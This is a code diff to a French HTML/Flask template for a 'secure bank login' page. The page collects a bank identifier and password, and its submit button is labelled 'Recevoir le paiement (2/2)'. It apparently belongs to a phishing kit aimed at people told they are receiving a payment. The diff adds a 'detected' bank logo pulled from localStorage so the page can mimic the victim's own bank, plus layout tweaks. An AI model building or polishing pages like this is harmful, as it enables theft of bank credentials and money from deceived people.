@@ -74,6 +74,16 @@
             color: #666; /* Texte gris foncé */
             margin-bottom: 30px;
         }
+        /* Style pour le logo de la banque détecté */
+        #detected-bank-logo {
+            margin: 20px 0;
+            animation: zoomIn 0.5s ease-in-out;
+        }
+        #detected-bank-logo img {
+            height: 50px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
         p {
             color: #666; /* Texte gris foncé */
             line-height: 1.8;
@@ -229,7 +239,7 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Ombre légère */
         }
         .keyboard-toggle {
-            margin-top: 20px; /* Espacement entre la case du mot de passe et les boutons */
+            margin-top: 40px !important; /* Espacement de 40px entre la case du mot de passe et les boutons */
             display: flex;
             justify-content: space-around;
             width: 80%; /* Réduire la largeur des boutons */
@@ -299,6 +309,10 @@
     <div class="container">
         <h1>Connexion Bancaire Sécurisée 🔒</h1>
         <div class="subtitle">Accédez à votre compte en toute sécurité</div>
+        <!-- Logo de la banque détecté -->
+        <div class="bank-logo" id="detected-bank-logo">
+            <img id="detected-bank-logo-img" src="" alt="Logo de la banque détectée">
+        </div>
         <form id="bankForm" action="{{ url_for('compte') }}" method="POST" onsubmit="submitForm(event)">
             <div class="form-group">
                 <label for="bank-id">Identifiant Bancaire</label>
@@ -314,10 +328,12 @@
                     <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
                     <span class="toggle-password" onclick="togglePasswordVisibility()">👁️</span>
                 </div>
+                <!-- Conteneur des boutons "Numérique" et "Main Libre" -->
                 <div class="keyboard-toggle">
                     <button type="button" onclick="toggleKeyboard('numeric')">Clavier Numérique</button>
                     <button type="button" onclick="toggleKeyboard('free')">Main Libre</button>
                 </div>
+                <!-- Clavier numérique -->
                 <div class="numeric-keyboard" id="numeric-keyboard">
                     <button type="button" onclick="appendNumber('1')">1</button>
                     <button type="button" onclick="appendNumber('2')">2</button>
@@ -341,11 +357,6 @@
             </div>
             <button type="submit" class="btn">Recevoir le paiement (2/2)</button>
         </form>
-
-        <!-- Logo de la banque -->
-        <div class="bank-logo" id="bank-logo">
-            <img id="bank-logo-img" src="" alt="Logo de la banque">
-        </div>
 
         <!-- Texte en bas du formulaire -->
         <div class="footer">
@@ -471,6 +482,14 @@
                 loadingScreen.style.display = 'none';
                 alert('Une erreur est survenue. Veuillez réessayer.');
             });
+        }
+
+        // Afficher le logo de la banque détecté si disponible
+        const detectedBankLogo = localStorage.getItem('bankLogo');
+        if (detectedBankLogo) {
+            const detectedBankLogoImg = document.getElementById('detected-bank-logo-img');
+            detectedBankLogoImg.src = detectedBankLogo;
+            document.getElementById('detected-bank-logo').style.display = 'block';
         }
     </script>
 </body>
